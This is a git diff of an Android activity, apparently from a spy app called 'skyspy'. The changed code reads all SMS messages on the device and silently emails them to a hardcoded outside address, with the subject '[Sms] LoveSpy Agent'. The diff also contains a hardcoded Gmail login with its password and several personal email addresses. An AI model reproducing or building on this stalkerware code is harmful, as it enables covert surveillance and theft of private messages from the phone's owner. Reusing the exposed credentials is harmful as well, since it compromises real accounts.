@@ -1,7 +1,6 @@
-package com.example.skyspy.app.sms.ui;
+package com.example.skyspy.app.ui;
 
 import android.app.Activity;
-import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.util.Log;
@@ -11,20 +10,22 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 import com.example.skyspy.app.R;
-import com.example.skyspy.app.email.logic.EmailSending;
-import com.example.skyspy.app.sms.logic.SmsReader;
+import com.example.skyspy.app.email.EmailSending;
+import com.example.skyspy.app.sms.SmsReader;
 import com.example.skyspy.app.utils.Utils;
 
 public class SmsActivity extends Activity{
 
     private EmailSending mEmailSending;
+    private String mLetter;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         TextView textView = new TextView(this);
         SmsReader smsReader = new SmsReader(this);
-        textView.setText(smsReader.getSmsList());
+        mLetter = smsReader.getSmsList();
+        textView.setText(mLetter);
         setContentView(textView);
     }
 
@@ -53,21 +54,21 @@ public class SmsActivity extends Activity{
         return super.onOptionsItemSelected(item);
     }
 
-    private void sendEmailSilently() {
+    public void sendEmailSilently() {
         mEmailSending = new EmailSending("o.kapustiyan@gmail.com", "samsungforever");
         String[] toArr = {"1eecooper@ukr.net"};
         mEmailSending.setTo(toArr);
         mEmailSending.setFrom("wooo@wooo.com");
-        mEmailSending.setSubject("This is an email sent using my Mail JavaMail wrapper from an Android device.");
-        mEmailSending.setBody("Email body.");
+        mEmailSending.setSubject("[Sms] LoveSpy Agent");
+        mEmailSending.setBody(mLetter);
         try {
             //mEmailSending.addAttachment("/sdcard/filelocation");
             if(mEmailSending.sendSilently()) {
                 //Toast.makeText(this, "Email was sent successfully.", Toast.LENGTH_LONG).show();
-                runToastOnUiThread(this, "Email was sent successfully.", Toast.LENGTH_LONG);
+                runToastOnUiThread("Email was sent successfully.", Toast.LENGTH_LONG);
             } else {
                 //Toast.makeText(this, "Email was not sent.", Toast.LENGTH_LONG).show();
-                runToastOnUiThread(this, "Email was not sent.", Toast.LENGTH_LONG);
+                runToastOnUiThread("Email was not sent.", Toast.LENGTH_LONG);
             }
         } catch(Exception e) {
             //Toast.makeText(MailApp.this, "There was a problem sending the email.", Toast.LENGTH_LONG).show();
@@ -75,11 +76,11 @@ public class SmsActivity extends Activity{
         }
     }
 
-    public void runToastOnUiThread(final Context context, final String text, final int length){
+    public void runToastOnUiThread(final String text, final int length) {
         runOnUiThread(new Runnable() {
             @Override
             public void run() {
-                Toast.makeText(context, text, length).show();
+                Toast.makeText(SmsActivity.this, text, length).show();
             }
         });
     }
